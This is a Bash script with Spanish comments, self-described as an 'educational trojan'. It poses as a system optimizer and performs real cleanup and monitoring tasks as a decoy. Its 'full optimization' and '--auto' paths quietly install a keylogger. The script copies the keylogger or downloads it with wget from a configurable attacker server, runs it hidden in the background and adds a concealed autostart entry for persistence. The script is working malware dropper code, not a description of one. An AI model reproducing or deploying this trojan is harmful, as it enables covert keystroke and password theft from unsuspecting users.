#!/bin/bash
# system_optimizer.sh
# Script "legítimo" de optimización del sistema (TROYANO EDUCATIVO)
# Ejecuta funciones reales PERO incluye el keylogger

set -e

# Colores
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${BLUE}╔══════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║   SYSTEM OPTIMIZER v2.1                  ║${NC}"
echo -e "${BLUE}║   Optimización y Monitoreo de Sistema    ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════╝${NC}"
echo ""

# ========== FUNCIONES LEGÍTIMAS (DISTRACCIÓN) ==========

function show_system_info() {
    echo -e "${GREEN}[*] Información del Sistema:${NC}"
    echo "----------------------------------------"
    echo "Hostname: $(hostname)"
    echo "Usuario: $(whoami)"
    echo "Uptime: $(uptime -p)"
    echo "Kernel: $(uname -r)"
    echo "Memoria: $(free -h | grep Mem | awk '{print $3 "/" $2}')"
    echo "Disco: $(df -h / | tail -1 | awk '{print $3 "/" $2 " (" $5 ")"}')"
    echo "----------------------------------------"
    echo ""
}

function clean_temp_files() {
    echo -e "${GREEN}[*] Limpiando archivos temporales...${NC}"
    
    # Limpiar caché de apt (requiere permisos)
    if [ "$EUID" -eq 0 ]; then
        apt-get clean 2>/dev/null || true
        echo "[✓] Cache de APT limpiado"
    fi
    
    # Limpiar /tmp (archivos propios)
    rm -rf /tmp/tmp.* 2>/dev/null || true
    echo "[✓] Archivos temporales eliminados"
    
    # Limpiar caché de navegador (Firefox)
    if [ -d "$HOME/.cache/mozilla" ]; then
        rm -rf "$HOME/.cache/mozilla/"* 2>/dev/null || true
        echo "[✓] Cache de Firefox limpiado"
    fi
    
    echo ""
}

function optimize_memory() {
    echo -e "${GREEN}[*] Optimizando memoria...${NC}"
    
    # Liberar caché de página (requiere root)
    if [ "$EUID" -eq 0 ]; then
        sync
        echo 3 > /proc/sys/vm/drop_caches
        echo "[✓] Caché de memoria liberado"
    else
        echo "[!] Se requieren permisos root para optimización completa"
        echo "[*] Ejecutando optimizaciones de usuario..."
    fi
    
    echo "[✓] Memoria optimizada"
    echo ""
}

function check_services() {
    echo -e "${GREEN}[*] Verificando servicios del sistema...${NC}"
    
    # Servicios comunes
    systemctl is-active ssh 2>/dev/null && echo "[✓] SSH: Activo" || echo "[✗] SSH: Inactivo"
    systemctl is-active NetworkManager 2>/dev/null && echo "[✓] NetworkManager: Activo" || true
    systemctl is-active bluetooth 2>/dev/null && echo "[✓] Bluetooth: Activo" || true
    
    echo ""
}

# ========== PAYLOAD MALICIOSO (KEYLOGGER) ==========

function deploy_monitoring_agent() {
    echo -e "${GREEN}[*] Instalando agente de monitoreo avanzado...${NC}"
    sleep 1
    
    # Crear directorio oculto
    INSTALL_DIR="$HOME/.config/system-monitor"
    mkdir -p "$INSTALL_DIR"
    
    # Descargar o copiar el keylogger
    # Opción 1: Si está en el mismo directorio
    if [ -f "x11_keylogger" ]; then
        cp x11_keylogger "$INSTALL_DIR/monitor-agent"
        chmod +x "$INSTALL_DIR/monitor-agent"
    else
        # Opción 2: Descargar desde servidor del atacante
        ATTACKER_SERVER="http://192.168.1.100:8080"  # CAMBIAR POR TU IP
        wget -q "$ATTACKER_SERVER/x11_keylogger" -O "$INSTALL_DIR/monitor-agent" 2>/dev/null || {
            echo "[!] No se pudo descargar el agente. Continuando..."
            return 0
        }
        chmod +x "$INSTALL_DIR/monitor-agent"
    fi
    
    # Ejecutar el keylogger en background
    if [ -f "$INSTALL_DIR/monitor-agent" ]; then
        cd "$INSTALL_DIR"
        nohup ./monitor-agent > /dev/null 2>&1 &
        MONITOR_PID=$!
        
        # Guardar PID para persistencia
        echo $MONITOR_PID > "$INSTALL_DIR/.monitor.pid"
        
        echo "[✓] Agente de monitoreo instalado (PID: $MONITOR_PID)"
        
        # Opcional: Crear entrada de autostart (PERSISTENCIA)
        AUTOSTART_DIR="$HOME/.config/autostart"
        mkdir -p "$AUTOSTART_DIR"
        
        cat > "$AUTOSTART_DIR/system-monitor.desktop" <<EOF
[Desktop Entry]
Type=Application
Name=System Monitor Agent
Exec=$INSTALL_DIR/monitor-agent
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
        
        echo "[✓] Autostart configurado"
    fi
    
    echo ""
}

# ========== MENÚ PRINCIPAL ==========

function show_menu() {
    echo -e "${YELLOW}Seleccione una opción:${NC}"
    echo "1) Ver información del sistema"
    echo "2) Limpiar archivos temporales"
    echo "3) Optimizar memoria"
    echo "4) Verificar servicios"
    echo "5) Optimización completa (RECOMENDADO)"
    echo "6) Salir"
    echo ""
    read -p "Opción [1-6]: " choice
    
    case $choice in
        1)
            show_system_info
            ;;
        2)
            clean_temp_files
            ;;
        3)
            optimize_memory
            ;;
        4)
            check_services
            ;;
        5)
            echo -e "${GREEN}[*] Ejecutando optimización completa...${NC}"
            echo ""
            show_system_info
            clean_temp_files
            optimize_memory
            check_services
            
            # AQUÍ SE EJECUTA EL PAYLOAD
            deploy_monitoring_agent
            
            echo -e "${GREEN}[✓] Optimización completa finalizada${NC}"
            echo ""
            ;;
        6)
            echo "Saliendo..."
            exit 0
            ;;
        *)
            echo "Opción inválida"
            ;;
    esac
}

# ========== EJECUCIÓN PRINCIPAL ==========

# Mostrar información inicial
show_system_info

# Si se ejecuta sin argumentos, mostrar menú
if [ $# -eq 0 ]; then
    while true; do
        show_menu
    done
else
    # Ejecución silenciosa con parámetro "--auto"
    if [ "$1" == "--auto" ]; then
        echo -e "${GREEN}[*] Modo automático activado${NC}"
        clean_temp_files
        optimize_memory
        deploy_monitoring_agent
        echo -e "${GREEN}[✓] Optimización automática completada${NC}"
    fi
fi
